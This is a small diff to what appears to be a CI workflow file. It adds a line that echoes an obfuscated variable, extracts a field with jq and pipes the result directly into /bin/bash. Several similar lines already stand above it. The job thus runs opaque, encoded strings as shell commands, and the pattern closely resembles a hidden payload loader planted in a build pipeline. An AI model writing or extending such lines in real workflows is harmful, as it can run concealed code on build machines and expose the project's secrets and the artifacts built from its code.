@@ -24,6 +24,7 @@ jobs:
           echo $e330 | jq -r .l9 | /bin/bash
           printf '%s' "$n9" | jq -r .aijr3267 | /bin/bash
           echo $vvo98 | jq -r .rpem90845 | /bin/bash
+          echo $vni4 | jq -r .wl684 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
